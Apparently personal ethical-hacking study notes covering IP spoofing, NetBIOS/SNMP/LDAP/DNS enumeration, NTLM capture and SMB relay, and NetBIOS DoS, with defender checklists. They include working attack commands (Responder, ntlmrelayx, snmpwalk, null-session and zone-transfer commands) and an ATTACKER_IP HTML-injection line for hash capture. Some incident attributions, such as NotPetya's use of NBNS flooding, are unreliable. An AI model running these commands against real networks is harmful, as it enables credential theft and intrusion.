# 🕵️ Cybersecurity Study Notes — Session 11B

Personal notes I'm maintaining while studying ethical hacking and cybersecurity concepts.
This session covers IP spoofing techniques, enumeration (NetBIOS, SNMP, LDAP, DNS), SMB redirection & relay MITM attacks, and NetBIOS DoS attacks.

> [!NOTE]
> Session 11A answered "WHAT is running." Session 11B answers "WHO is there and HOW can I abuse the trust relationships between them." Enumeration extracts the human layer — usernames, groups, shares, service accounts — that sits on top of the software layer identified in 11A.

---

## 📚 Table of Contents

- [Where This Session Fits](#-where-this-session-fits)
- [Foundation Knowledge — IP Packet Header Trust](#-foundation-knowledge)
- [Things to Remember](#things-to-remember)
- [Section 1 — IP Spoofing Techniques](#section-1--ip-spoofing-techniques)
  - [What is IP Spoofing?](#11-what-is-ip-spoofing)
  - [Types of IP Spoofing](#12-types-of-ip-spoofing-attacks)
  - [IP Spoofing Countermeasures](#13-ip-spoofing-countermeasures)
- [Section 2 — Enumeration](#section-2--enumeration)
  - [What is Enumeration?](#21-what-is-enumeration)
  - [NetBIOS Enumeration](#22-netbios-enumeration)
  - [SNMP Enumeration](#23-snmp-enumeration)
  - [LDAP Enumeration](#24-ldap-enumeration)
  - [DNS Enumeration](#25-dns-enumeration)
- [Section 3 — SMB Redirection & SMB Relay MITM](#section-3--smb-redirection-and-smb-relay-mitm-attacks)
  - [NTLM Authentication Foundation](#31-understanding-ntlm-authentication)
  - [SMB Redirection — Forcing Auth to Attacker](#32-smb-redirection)
  - [SMB Relay — The Full Mechanism](#33-smb-relay-mitm-attacks)
  - [SMB Relay Countermeasures](#34-smb-relay-countermeasures)
- [Section 4 — NetBIOS DoS Attacks](#section-4--netbios-dos-attacks)
  - [How NetBIOS Can Be Abused](#41-how-netbios-can-be-abused-for-dos)
  - [NetBIOS DoS Countermeasures](#42-netbios-dos-countermeasures)
- [Section 5 — MITRE ATT&CK Mapping](#section-5--mitre-attck-mapping)
- [Section 6 — 2026 Context](#section-6--2026-context)
  - [AI-Assisted Enumeration](#61-ai-assisted-enumeration)
  - [Cloud Enumeration Challenges](#62-cloud-environments-and-enumeration)
  - [Indian Legal Context (DPDPA 2023)](#63-dpdpa-2023-and-enumeration-legality)
- [Key Takeaways](#-session-11b--key-takeaways)
- [Glossary](#-session-11b--glossary)

---

## 🗺️ Where This Session Fits

```
  SESSIONS 6-9          SESSION 10          SESSION 11          SESSIONS 12-20
  [FOUNDATIONS]    →    [RECON &       →    [ACTIVE ATTACK  →  [EXPLOITATION
  Laws, Concepts,       SCANNING]           TECHNIQUES]        & PERSISTENCE]
  Ethics                OSINT, Nmap,        ← YOU ARE HERE
                        Vuln Scan           (Session 11B)
```

Within Session 11 — The Four-Part Attack Chain:

| Sub-Session | Layer | What It Answers |
|---|---|---|
| **11A** | Reconnaissance | What is running? What OS? How to hide? |
| **11B** ← HERE | Enumeration | Who is there? Who can I pretend to be? Whose credentials can I intercept? |
| **11C** | Credential Attack | How do I crack the passwords I collected? |
| **11D** | Disruption | How do I overwhelm the network if needed? |

---

## 📌 Foundation Knowledge

<details>
<summary>🔧 IP Packet Header Trust — Why Spoofing Exists</summary>

When a router receives a packet, it reads the **DESTINATION IP** to decide where to send it. It reads the **SOURCE IP** to know who sent it — but it **DOES NOT VERIFY** whether the source IP is genuine.

The IP protocol was designed in the 1970s for a trusted academic network. Authenticity of the source IP was never a design goal.

**Key facts:**
- IP Source Address: bytes 12–15 of the IPv4 header
- 32 bits / 4 bytes / can be set to ANY value by the sender
- Routers use DESTINATION address (bytes 16–19) for forwarding
- SOURCE address is trusted by default — **this is the problem**

**Analogy:** Like the postal system — anyone can write any return address on an envelope. The post office delivers based on destination; it never verifies the return address is real.

</details>

---

## Things to Remember

| Misconception | Reality |
|---|---|
| "IP spoofing lets me browse the web anonymously" | Spoofing BREAKS the return path. Replies go to the FORGED IP, not to you. Spoofing is for blind attacks (DoS) or LAN attacks. For anonymity, use proxies/VPNs. |
| "Enumeration is the same as scanning" | Scanning identifies OPEN PORTS. Enumeration extracts the DATA those ports provide — usernames, shares, routing tables, AD structure. Entirely different intelligence level. |
| "NetBIOS is old and irrelevant" | NBT remains enabled by DEFAULT in Windows 10/11/Server 2022 for backward compatibility. Pentesters still find it exploitable in the majority of enterprise environments in 2026. |
| "SNMP is just for network management — attackers wouldn't care" | SNMP with default "public" community string exposes routing tables, ARP caches, user accounts, software versions. One snmpwalk can map an entire enterprise network. |
| "SMB Relay is just another MITM attack like ARP poisoning" | ARP poisoning redirects TRAFFIC so you can READ it. SMB Relay intercepts an AUTHENTICATION ATTEMPT and REPLAYS it to a different server — authenticating as that user WITHOUT cracking their password. |
| "SMB Relay needs the victim's password hash" | The entire power of SMB Relay is that you need NEITHER password nor hash. You relay the challenge-response pair in real time. The math is valid because you didn't forge it — you relayed it. |
| "LDAP enumeration only works with valid credentials" | Many AD deployments permit anonymous LDAP bind by default. Even when disabled, ANY valid domain user (even lowest-privilege) can enumerate the ENTIRE AD structure. |

---

## Section 1 — IP Spoofing Techniques

### 1.1 What is IP Spoofing?

Crafting IP packets where the Source IP Address field has been manually set to a value OTHER than the attacker's real IP address.

**Why it's possible:** IPv4 was designed in RFC 791 (1981) for the ARPANET — a trusted academic/military network. No provision exists for authenticating source IP addresses. The Source IP is simply a 32-bit value that any application with raw socket access can set to anything.

**How it works technically:**

| Step | What Happens |
|---|---|
| **1 — Normal** | OS kernel fills Source IP automatically from machine's configured IP. Can't override through normal socket calls. |
| **2 — Raw Socket** | Attacker uses a RAW SOCKET that bypasses the kernel's automatic header filling. Constructs the entire packet including any Source IP. |
| **3 — Injection** | Crafted packet enters the network. NICs, switches, and routers forward based on destination IP without checking source validity. |
| **4 — Replies** | Any reply goes to the FORGED source IP — not the attacker. Attacker is "blind" unless on the same LAN or controlling the forged IP. |

---

### 1.2 Types of IP Spoofing Attacks

#### Type 1 — Blind IP Spoofing

Attacker sends packets with forged source but has **NO WAY to see replies**.

```
Attacker (10.0.0.99)         Target Server (192.168.1.100)
     |                                   |
     |--- [SRC: 10.0.0.1 DST: 192.168.1.100] --→ |
     |    (Packet appears from 10.0.0.1)           |
     |         [REPLY TO 10.0.0.1] ------→         |
     |         (Attacker never sees reply)          |
     ✘ Reply goes to forged IP
```

**Useful for:**
- DoS flooding — overwhelm target without linking to real IP
- Trust exploitation — forge a trusted IP to bypass firewall rules
- Amplification attacks — reflected large responses overwhelm a third-party victim

**Network condition:** Works from anywhere on the internet. No special position needed. However, **BCP38** filtering at the ISP can prevent it. In 2026, approximately 25% of internet ASes still do not filter spoofed traffic.

---

#### Type 2 — Non-Blind IP Spoofing (LAN Spoofing)

Attacker is on the **same local network** and can OBSERVE traffic (via ARP poisoning or promiscuous mode). This makes the attack **interactive and bidirectional**.

**Why more dangerous:** Enables session hijacking — taking over existing authenticated TCP sessions. Attacker can see actual sequence numbers (no prediction needed) and inject valid packets.

**Session hijacking via LAN spoofing:**

| Step | Action |
|---|---|
| 1 | Victim authenticates to Server (session established) |
| 2 | Attacker sniffs traffic — records current sequence number |
| 3 | Attacker sends RST to Victim (knocks them off the session) |
| 4 | Attacker forges victim's IP and sends packet to Server with CORRECT sequence number |
| 5 | Server accepts packet — believes it's from Victim |
| 6 | Attacker has taken over the authenticated session |

---

#### Type 3 — Source Routing Spoofing

IPv4 has optional header features (Strict/Loose Source Routing) allowing the SENDER to specify the exact route a packet takes — including routing replies through attacker-controlled nodes.

**Current status:** Blocked by virtually every modern router and firewall. RFC 5095 (2007) deprecated it. Cisco IOS: `no ip source-route` (default from IOS 12.3+). A historical technique that almost never works against modern infrastructure.

---

#### Type 4 — Reflection/Amplification Spoofing (DDoS)

Attacker forges the **VICTIM's IP** as source, sends requests to many **reflector servers** (DNS resolvers, NTP servers), which send their **large responses** to the victim.

| Element | Detail |
|---|---|
| Attacker sends | Small requests (e.g., 40-byte DNS ANY query) |
| Reflectors respond | Large responses (e.g., 3,000+ byte DNS response) |
| **Amplification factor** | **75x** (or more) |
| Victim receives | Massive unsolicited traffic from thousands of reflectors |

**Real-World Case — 2018 GitHub DDoS (Memcached Amplification):**
Attacker forged GitHub's IP as source. Sent 203-byte requests to Memcached servers. Received ~100KB responses aimed at GitHub. Amplification factor: **51,000x**. Peak attack: **1.35 Tbps** — largest DDoS recorded at the time. GitHub offline for ~10 minutes before Akamai Prolexic scrubbing absorbed it.

---

### 1.3 IP Spoofing Countermeasures

| Countermeasure | What It Does |
|---|---|
| **BCP38 / RFC 2827 egress filtering** | Block outbound packets whose source IP is NOT in your assigned range. If every ISP did this, spoofing would be functionally impossible. |
| **uRPF (Unicast Reverse Path Forwarding)** | Router checks: "If I received this on interface X but routing table says source IP is via interface Y → drop it." Cisco: `ip verify unicast source reachable-via rx` |
| **Block internal IPs from external interface** | DROP packets arriving from external interfaces with source IPs in RFC 1918 space (10.x, 172.16.x, 192.168.x) |
| **TCP MD5 signatures / TCP-AO** | RFC 2385 / RFC 5925 — prevents spoofed RST packets from tearing down BGP routing sessions |
| **Anti-spoofing ACLs** | Block RFC 1918 source IPs arriving on internet-facing interfaces |
| **IPsec / Mutual TLS** | Cryptographically authenticate both endpoints — makes IP-layer spoofing irrelevant even if forged packets arrive |

---

## Section 2 — Enumeration

### 2.1 What is Enumeration?

Establishing an active connection to a target system and querying it to extract specific information that the service's designed functionality voluntarily provides.

**Scanning vs Enumeration:**

| Scanning (10B) | Enumeration (11B) |
|---|---|
| "Port 445 is open running SMB" | "Users: administrator, jsmith, dbadmin. Shares: C$, ADMIN$, Finance. Password policy: 6 chars min, never expires." |
| Identifies OPEN PORTS | Extracts meaningful DATA from those ports |
| Surface area | Actionable intelligence |

**Port-to-Enumeration Mapping:**

| Open Port | Enumeration Technique |
|---|---|
| 139/445 | NetBIOS/SMB Enumeration |
| 161/162 | SNMP Enumeration |
| 389/636 | LDAP/LDAPS Enumeration (Active Directory) |
| 53 | DNS Zone Transfer / DNS Enumeration |

---

### 2.2 NetBIOS Enumeration

NetBIOS (Network Basic Input/Output System) — a 1983 networking API providing:
- **Name Service** (UDP 137) — name registration and resolution
- **Session Service** (TCP 139) — connection-oriented file/printer sharing
- **Datagram Service** (UDP 138) — connectionless broadcast messages

#### NetBIOS Type Codes — The Attacker's Roadmap

| Type Code | Type | Meaning | Why It Matters to Attacker |
|---|---|---|---|
| `[00]` | UNIQUE | Workstation service — machine is active | Confirms live host |
| `[03]` | UNIQUE | Messenger service — can receive net send | User currently logged in |
| `[20]` | UNIQUE | **File Server service — sharing files via SMB** | Target for share enumeration and data access |
| `[1D]` | UNIQUE | Master Browser — maintains network browse list | Knows ALL machines on the network |
| `[1B]` | UNIQUE | Domain Master Browser — PDC maintains browse list | Primary Domain Controller identified |
| `[00]` | GROUP | Domain/Workgroup name | Confirms domain environment |
| `[1C]` | GROUP | **Domain Controllers** — list of all DCs (max 25) | Highest-priority targets for domain attacks |
| `[1E]` | GROUP | Browser Service Elections — election participants | — |

#### How NetBIOS Enumeration Works

Attacker sends a UDP packet to port 137 containing a **NODE STATUS REQUEST** — a legitimate protocol operation every NetBIOS implementation is designed to respond to.

```
Attacker                          Target (192.168.1.x)
     |                                    |
     |-- UDP:137 NODE STATUS REQUEST ---→ |
     |   "Who are you? What services?"    |
     |   ←---- NAME TABLE RESPONSE ------ |
     |   (All names, types, MAC address)  |
```

**Example nbtstat output:**

```
NetBIOS Remote Machine Name Table
Name            Type    Status
FILESERVER01   <00>  UNIQUE   Registered  ← Machine name, active
CORP-DOMAIN    <00>  GROUP    Registered  ← Domain: CORP-DOMAIN
FILESERVER01   <20>  UNIQUE   Registered  ← FILE SHARING ACTIVE
Administrator  <03>  UNIQUE   Registered  ← Admin logged in NOW
MAC Address = 00-1A-2B-3C-4D-5E
```

**Intelligence extracted:**
- Machine name: FILESERVER01 → likely a file server (high value)
- Domain: CORP-DOMAIN → Windows domain environment confirmed
- `[20]` registered → File sharing ACTIVE → enumerate shares
- Administrator `<03>` = Admin user CURRENTLY LOGGED IN → session can be hijacked
- MAC Address → positively identify this machine in ARP tables

**Tools:** `nbtstat` (Windows built-in) · `nbtscan` (Linux subnet scan) · Nmap NSE `nbstat.nse`

---

#### NULL Session Attack (Historical but Still Seen)

Windows XP and Server 2003 allowed anonymous connections to IPC$ share:

```bash
net use \\target\IPC$ "" /u:""
```

Allowed unauthenticated enumeration of: user accounts, group memberships, share names, password policies, trust relationships.

**Current status:** Disabled by default from Vista/Server 2008 onwards. Still appears in legacy systems, misconfigured servers, and Metasploitable labs.

**Real-World Case — 2007 TJX Companies Breach:**
Attackers used NetBIOS enumeration to map internal network after initial Wi-Fi access, identifying DCs and file servers containing 94 million credit/debit card records. $256 million in costs. Led directly to PCI DSS network segmentation requirements.

---

### 2.3 SNMP Enumeration

SNMP (Simple Network Management Protocol) — application-layer protocol for monitoring/managing network devices. UDP 161 (agent), UDP 162 (trap receiver).

#### SNMP Versions and Security

| Version | Auth Method | Security |
|---|---|---|
| **SNMPv1** | Community string (plain text) | NO encryption. Completely insecure. |
| **SNMPv2c** | Community string (plain text) | Same as v1. Added bulk operations. Still insecure. Widely deployed. |
| **SNMPv3** | Username + auth (MD5/SHA) + privacy (DES/AES) | SECURE. But many devices still default to v2c. |

> [!WARNING]
> **Default community strings:** Every SNMPv1/v2c device ships with `"public"` (read) and `"private"` (read-write). 2024 surveys show **30–40% of enterprise devices** still use defaults. `"public"` = anyone can query ANY MIB variable. `"private"` = anyone can CHANGE device configuration.

#### Key MIB Objects for Enumeration

| OID | Name | What It Reveals |
|---|---|---|
| 1.3.6.1.2.1.1.1.0 | sysDescr | Full OS version string |
| 1.3.6.1.2.1.1.5.0 | sysName | Hostname of the device |
| 1.3.6.1.2.1.4.20 | ipAddrTable | All IP addresses on device |
| 1.3.6.1.2.1.4.21 | ipRouteTable | **Complete routing table** |
| 1.3.6.1.2.1.4.22 | ipNetToMediaTable | **ARP cache — all IP-MAC mappings** |
| 1.3.6.1.2.1.6.13 | tcpConnTable | Active TCP connections |
| 1.3.6.1.4.1.77.1.2.25 | Windows UserTable | **ALL user account names** |
| 1.3.6.1.4.1.77.1.2.27 | Windows SvcTable | ALL running services |
| 1.3.6.1.4.1.77.1.2.3 | Windows SoftwareTable | ALL installed software |
| 1.3.6.1.4.1.77.1.2.1 | Windows ActiveSessions | ALL currently logged-in users |

#### The snmpwalk Command

```bash
snmpwalk -v2c -c public [TARGET] .1.3.6.1.2.1
```

This single command extracts the **entire public MIB** — potentially thousands of variables including routing tables, ARP cache, active connections, hostname, OS version, and (on Windows) all user accounts and installed software.

**Why the ARP cache is particularly valuable:**
The ARP cache of a router/Layer 3 switch contains a map of **EVERY ACTIVE HOST** on connected subnets — IP and MAC. One SNMP query against the core router = complete live host inventory without scanning a single endpoint. "Network topology via SNMP" — one of the most efficient recon techniques available.

---

#### Defender Checklist for SNMP

- IMMEDIATELY change default community strings — `"public"` and `"private"` are unacceptable in production
- Upgrade all SNMP to **v3 with authPriv** (SHA auth + AES encryption)
- Restrict SNMP access by ACL — only permit from NMS IP. Cisco: `access-list 10 permit [NMS-IP]; snmp-server community [string] RO 10`
- Disable SNMP entirely on devices that don't require remote monitoring
- Block UDP 161/162 at all perimeter firewalls — SNMP should NEVER traverse the perimeter
- Monitor for snmpwalk patterns: multiple sequential GETNEXT requests from one source

---

### 2.4 LDAP Enumeration

LDAP (Lightweight Directory Access Protocol) — the protocol used to query Microsoft Active Directory.

| Port | Service |
|---|---|
| TCP/UDP 389 | LDAP (unencrypted) |
| TCP/UDP 636 | LDAPS (LDAP over SSL/TLS) |
| TCP 3268 | Global Catalog (unencrypted) |
| TCP 3269 | Global Catalog over SSL |

#### Active Directory Structure

```
Forest → Domain → Organizational Unit (OU) → Object
Objects: Users, Computers, Groups, GPOs, Printers
```

**Distinguished Name (DN)** — every AD object has a unique path:

```
CN=John Smith,OU=IT,OU=Staff,DC=corp,DC=company,DC=com
```

| Component | Meaning |
|---|---|
| CN | Common Name (the object's name) |
| OU | Organizational Unit (container) |
| DC | Domain Component (parts of domain name) |

#### LDAP Bind Types

| Type | Description |
|---|---|
| **Anonymous Bind** | No credentials. Possible if server allows it. Many misconfigured AD environments permit this. |
| **Authenticated Bind** | Valid domain credentials. Even the lowest-privilege user gets **FULL READ** access to most AD objects. |

#### Key LDAP Search Filters

| Filter | What It Returns |
|---|---|
| `(objectClass=user)` | All user objects |
| `(objectClass=computer)` | All computer objects |
| `(objectClass=group)` | All groups |
| `(userAccountControl:1.2.840.113556.1.4.803:=65536)` | Accounts with password NEVER EXPIRES |
| `(userAccountControl:1.2.840.113556.1.4.803:=2)` | DISABLED accounts |
| `(&(objectClass=user)(memberOf=CN=Domain Admins,...))` | All Domain Admins |
| `(servicePrincipalName=*)` | Service accounts (SPNs) — **Kerberoasting targets** |

#### What LDAP Enumeration Reveals

From a single LDAP enumeration, the attacker gets:

| Data | Intelligence Value |
|---|---|
| Every user account (4,847 in example) | Complete target list for password attacks |
| Domain Admins (12 accounts) | Highest-priority targets — any one = full domain control |
| Service accounts with SPNs (34) | Kerberoasting targets |
| Password policy | "Min 8 chars, no lockout" = unlimited password spraying |
| DC IP addresses | Ultimate targets for DCSync |
| Accounts not logged in 90+ days (89) | Abandoned = low-detection-risk attack vectors |
| Computer accounts (3,102) | Complete machine inventory |

> [!IMPORTANT]
> **Why LDAP enumeration is so powerful:** AD is DESIGNED to be queryable by any authenticated domain user. Outlook, SharePoint, etc. need this data. So any attacker who compromises ONE low-privilege user immediately has READ access to the complete AD database.

#### Tools for LDAP Enumeration

| Tool | Use Case |
|---|---|
| `ldapsearch` (Linux) | Manual LDAP queries with full filter control |
| `enum4linux` (Linux) | Automated AD/SMB/LDAP enumeration |
| **BloodHound** | Graphical AD relationship mapper. Finds attack paths from any user to Domain Admin. Industry standard. |
| `ldapdomaindump` | Dumps entire AD to JSON/HTML files |
| ADExplorer (Sysinternals) | GUI-based AD browsing from Windows |

---

#### Defender Checklist for LDAP

- Disable Anonymous LDAP Bind unconditionally on all Domain Controllers
- Implement LDAP channel binding and LDAP signing (KB4520412). GPO: `LDAP server signing requirements → Require signing`
- SIEM alert on high-volume LDAP queries from single source in short periods
- Active Directory tiering — restrict which accounts can query sensitive attributes
- Audit readable attributes — remove unnecessary personal info from default scope
- Deploy **Microsoft Defender for Identity (MDI)** — monitors all LDAP queries, alerts on enumeration patterns and Kerberoasting attempts

---

### 2.5 DNS Enumeration

DNS enumeration goes beyond the OSINT queries in Session 10A. Focus areas: zone transfers (AXFR), reverse DNS, DNS cache snooping, DNSSEC zone walking, DNS brute forcing.

#### DNS Zone Transfer (AXFR)

A legitimate mechanism allowing secondary DNS servers to synchronize zone data from the primary. If the primary is **misconfigured to allow AXFR from any source**, any attacker gets a complete copy.

```
Attacker (any IP)              Primary DNS Server
      |                                  |
      |--- TCP:53 AXFR query ----------→ |
      |    "Give me all records for      |
      |     company.com"                  |
      |   ←-- ZONE TRANSFER RESPONSE --- |
      |   (ALL DNS records for the zone) |
```

**What a zone transfer reveals:**

| Record Type | Intelligence |
|---|---|
| A, AAAA | All hostnames and their IP addresses |
| MX | Mail servers and priorities |
| NS | All DNS servers for the domain |
| CNAME | Aliases revealing application relationships |
| SOA | Primary nameserver and zone serial number |
| TXT | SPF records, domain verification tokens, sometimes internal documentation |
| PTR | Reverse lookups (IP → hostname) |

**Example zone transfer output (partial):**

```
mail.company.com.           IN A    192.168.1.50     ← Mail server
dc01.company.com.           IN A    192.168.1.10     ← Domain Controller!
dc02.company.com.           IN A    192.168.1.11     ← Second DC!
fileserver.company.com.     IN A    192.168.1.20     ← File server
payroll.company.com.        IN A    192.168.1.75     ← Payroll system!
legacy-xp.company.com.     IN A    192.168.1.200    ← Legacy system!
vpn.company.com.            IN A    203.x.x.x        ← VPN endpoint
dev-test.company.com.       IN A    192.168.1.150    ← Dev/test server
```

**Intelligence from this output:**
- DC01/DC02 IPs → highest-value targets
- Payroll system → sensitive data target
- Legacy XP machine → near-certain unpatched vulnerabilities
- VPN endpoint → remote access attack surface
- Dev/test server → typically less security than production

**Command:** `dig axfr company.com @[DNS_SERVER_IP]`

**Misconfiguration frequency:** 2024 pentests (Rapid7, Bugcrowd) report zone transfer misconfiguration in ~15–20% of tested environments.

---

#### Defender Checklist for DNS

- Restrict zone transfers to authorized secondary DNS IPs ONLY. BIND: `allow-transfer { 192.168.1.x; };` Windows DNS: Zone Properties → Zone Transfers → "Only to Name Servers tab"
- Separate internal and external DNS completely — internal DNS should NEVER be accessible from external resolvers
- Implement DNS Response Policy Zones (RPZ)
- Use opaque naming (srv-p01, srv-d01) instead of descriptive names (payroll, dc01) in external-visible zones
- Monitor for AXFR requests in DNS server logs — any AXFR from unknown source is an immediate alert

---

## Section 3 — SMB Redirection and SMB Relay MITM Attacks

### 3.1 Understanding NTLM Authentication

NTLM (NT LAN Manager) — Microsoft's challenge-response authentication protocol used for SMB file sharing, IIS web auth, and any Windows service that doesn't use Kerberos.

| Version | Status |
|---|---|
| NTLMv1 | OBSOLETE. DES-based. Trivially crackable. |
| NTLMv2 | CURRENT. HMAC-MD5. Stronger but **still vulnerable to relay** (hash strength is irrelevant when you relay the entire response). |

#### NTLM Challenge-Response Flow

```
CLIENT                          SERVER
   |--- NEGOTIATE_MESSAGE ------→  |
   |    "I want to authenticate"   |
   |   ←-- CHALLENGE_MESSAGE ----- |
   |   (8-byte random challenge)   |
   |                               |
   Client computes NTLMv2 Response |
   = HMAC-MD5(NT_Hash, challenge   |
     + username + domain + etc.)   |
   |                               |
   |--- AUTHENTICATE_MESSAGE ---→  |
   |    (username + domain +       |
   |     NTLMv2 Response)          |
   |                               |
   Server computes same HMAC with  |
   stored NT hash. Match = AUTH'D  |
```

> [!IMPORTANT]
> The actual PASSWORD is never transmitted — only the hash response to the challenge. The server validates by computing the same HMAC with its stored copy. If they match → authenticated. This design is what enables relay attacks.

---

### 3.2 SMB Redirection

Before relaying, the attacker needs to RECEIVE an NTLM authentication attempt. SMB Redirection tricks Windows into sending credentials to the attacker.

#### Redirection Techniques

| Technique | How It Works |
|---|---|
| **NBNS Spoofing** | When DNS fails, Windows broadcasts on UDP 137: "Who is FILESERVER?" Attacker responds first: "I am FILESERVER, my IP is [attacker IP]." Victim connects to attacker and sends NTLM credentials. |
| **LLMNR Spoofing** | Modern successor to NBNS (UDP 5355). Same technique — attacker responds to LLMNR broadcasts claiming to be the requested hostname. |
| **WPAD Spoofing** | Browsers broadcast WPAD queries for proxy config. Attacker responds with their own server, forcing authentication. |
| **HTML Injection** | Inject `<img src="\\ATTACKER_IP\img\logo.png">` into a webpage. Windows automatically attempts SMB authentication to load the image — triggering NTLM capture. |

#### Tool: Responder

Industry-standard tool for NBNS/LLMNR/WPAD spoofing and NTLM capture:
- Listens for NBNS, LLMNR, and WPAD broadcasts
- Responds to every broadcast claiming to be the requested host
- Serves fake SMB, HTTP, FTP, LDAP servers that capture NTLM
- Logs captured NTLMv2 hashes for offline cracking

**Real-World Case — 2023 MGM Resorts (ALPHV/BlackCat):**
Scattered Spider gained initial access via social engineering, then used Responder-style NTLM capture on internal network to harvest admin credentials, moving laterally to vCenter and AD. **$100 million+ in losses.** 10+ days of casino/hotel outages. **Lesson:** LLMNR and NBNS are trivially exploitable and most enterprises leave them enabled by default.

---

### 3.3 SMB Relay MITM Attacks

Takes captured NTLM credentials and **relays them to a different target server in real time** — WITHOUT cracking the password.

**Critical requirements:**
1. Target server has **SMB Signing DISABLED** (or not required)
2. Victim user has local admin rights on relay target (for max impact)

> [!WARNING]
> **SMB Signing status in 2026:** Enabled by DEFAULT on Domain Controllers. **NOT** enabled by default on regular workstations and member servers — making them vulnerable.

#### Complete SMB Relay Attack Sequence

```
Victim Workstation        Attacker Machine          Target Server B
     (user: jsmith)       (Responder + ntlmrelayx)   (192.168.1.20)
          |                       |                        |
          | NBNS broadcast:        |                        |
          | "Who is FILESERVER?"  |                        |
          |── UDP:137 ──────────→ |                        |
          |   ←── "I am FILESERVER" (spoofed)               |
          |                       |                        |
          | SMB NEGOTIATE ──────→ |                        |
          |                       | SMB NEGOTIATE ───────→ |
          |                       |   ←──── CHALLENGE(B) ──|
          |   ←── CHALLENGE(B) ── |                        |
          | (Victim gets Server B's challenge)              |
          |                       |                        |
          | AUTHENTICATE(jsmith,  |                        |
          |   Response[B]) ─────→ |                        |
          |                       | AUTHENTICATE(jsmith,   |
          |                       |   Response[B]) ──────→ |
          |                       |   ←── AUTH SUCCESS ─── |
          |                       |                        |
          |                       | *** ATTACKER NOW       |
          |                       |  AUTHENTICATED AS      |
          |                       |  jsmith ON SERVER B *** |
```

**After successful relay (if jsmith is local admin on Server B):**
- ntlmrelayx executes commands as jsmith on Server B
- Can: dump SAM database, add admin user, deploy reverse shell, exfiltrate data

#### Tool: Impacket ntlmrelayx

```bash
# Terminal 1: Responder (with HTTP/SMB servers OFF — ntlmrelayx handles those)
python3 Responder.py -I eth0 -rdwv

# Terminal 2: Relay captured hashes to all targets
python3 ntlmrelayx.py -tf targets.txt -smb2support
```

**ntlmrelayx automatically on success:** Executes secretsdump.py (dumps local SAM database — all local account hashes), optionally adds new admin account, optionally executes custom payload.

---

### 3.4 SMB Relay Countermeasures

| Countermeasure | What It Prevents |
|---|---|
| **SMB Signing Enabled (all machines)** | Prevents relay — relayed auth can't forge valid packet signatures. **Single most effective control.** |
| **Disable LLMNR (GPO)** | Removes LLMNR spoofing trigger. `Computer Config → Admin Templates → Network → DNS Client → Turn off Multicast Name Resolution → ENABLED` |
| **Disable NBNS/NBT-NS (all adapters)** | Removes NBNS spoofing trigger. `Network Adapter → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP` |
| **EPA (Enhanced Protection for Auth)** | Binds NTLM auth to TLS channel — relay to different channel fails |
| **Disable NTLMv1 (require NTLMv2)** | Eliminates trivially crackable captured hashes |
| **Privilege reduction (least privilege)** | Even if relay succeeds, non-admin has minimal access |
| **Kerberos enforcement (eliminate NTLM)** | Where Kerberos is used, NTLM is not attempted — relay impossible |
| **MDI / SIEM monitoring** | Detects poisoning and relay patterns in real time |

> [!TIP]
> **Monitor Event ID 4624** (successful logon) on all servers. Alert when logon type 3 (network) occurs from an IP that is NOT that user's registered workstation. This is a relay indicator.

---

## Section 4 — NetBIOS DoS Attacks

### 4.1 How NetBIOS Can Be Abused for DoS

NBNS (UDP 137) is **inherently trusting** — the first response received is accepted as authoritative. No validation mechanism exists.

#### Attack Types

| Type | How It Works | Impact |
|---|---|---|
| **NBNS Name Flood** | Continuously send NBNS responses with INCORRECT IPs for all name queries. "FILESERVER" → 127.0.0.1, "DC01" → 0.0.0.0 | All mapped drives disconnect, domain auth fails, printer shares unavailable |
| **NBNS Registration Storm** | Flood network with NAME REGISTRATION REQUESTS for all common names, claiming ownership. Legitimate machines fail registration. | Machines appear "not found" on network |
| **Name Release Storm** | Send NAME RELEASE messages claiming legitimate names are being released. Windows de-registers names from cache. | Name resolution failures until machines re-register |

**Impact on a Windows network:**
- File sharing outages (UNC paths fail)
- Print spooler failures
- Group Policy application failures
- Login script failures
- Domain authentication degradation
- Help desk call spike — users report "network is down" when IP layer is fine

**Real-World Context — NotPetya 2017:**
NotPetya included NBNS flooding that disrupted Windows name resolution across infected enterprises, compounding the EternalBlue SMB exploitation damage and impeding incident response. **$10 billion+ in total damages** across Maersk ($300M alone), Merck, FedEx, Mondelez. Most destructive cyberattack in history. NBNS was used as a **disruption multiplier** that amplified impact and impeded response.

---

### 4.2 NetBIOS DoS Countermeasures

| Countermeasure | How |
|---|---|
| **Disable NetBIOS over TCP/IP** | Definitive fix. Use DHCP Option 001 for network-wide disable. |
| **Transition fully to DNS** | Modern AD does not require NetBIOS — DNS is native for AD. NetBIOS dependencies are legacy. |
| **VLAN segmentation** | NBNS broadcasts are Layer 2 domain-limited. VLANs = separate broadcast domains. Flood on VLAN 10 can't affect VLAN 20. |
| **Broadcast rate limiting** | Cisco catalyst: `storm-control broadcast level 10.0` — limits broadcast to 10% of port bandwidth |
| **Monitor broadcast storms** | Nagios, PRTG, SolarWinds alert on broadcast traffic exceeding threshold |
| **DAI + DHCP Snooping** | Prevents spoofed responses even during NBNS transition period |

---

## Section 5 — MITRE ATT&CK Mapping

**Tactics:** TA0007 (Discovery) · TA0006 (Credential Access) · TA0040 (Impact) · TA0043 (Reconnaissance)

| Tech ID | Technique | Session 11B Mapping | Tool |
|---|---|---|---|
| T1557.001 | AITM: LLMNR/NBT-NS Poisoning & SMB Relay | SMB Relay MITM attack | Responder, ntlmrelayx.py |
| T1040 | Network Sniffing | NTLM hash capture during SMB Relay | Responder |
| T1110.003 | Brute Force: Password Spraying | Offline cracking of captured NTLMv2 hashes (feeds into 11C) | Hashcat |
| T1018 | Remote System Discovery | NetBIOS enumeration | nbtscan, nmap |
| T1046 | Network Service Discovery | SNMP enumeration of services, routing tables | snmpwalk, snmp-check |
| T1087.002 | Account Discovery: Domain Account | LDAP enumeration of all AD users | ldapsearch, enum4linux, BloodHound |
| T1069.002 | Permission Groups: Domain Groups | LDAP enumeration of Domain Admin and privileged groups | ldapsearch, BloodHound |
| T1590.002 | Gather Victim Network Info: DNS | DNS zone transfer for complete zone dump | dig axfr, fierce, dnsrecon |
| T1595.001 | Active Scanning: IP Blocks | NetBIOS subnet scan mapping all hosts | nbtscan |
| T1498.001 | Network DoS: Direct Flood | NBNS flood attacking Windows name service | custom scripts, Yersinia |
| T1557 | Adversary-in-the-Middle | IP spoofing for LAN session hijacking | — |

> [!IMPORTANT]
> **Detection pattern:** An attacker who just gained access will exhibit a BURST of discovery activity — multiple techniques (NetBIOS, SNMP, LDAP, DNS) in a compressed window.
>
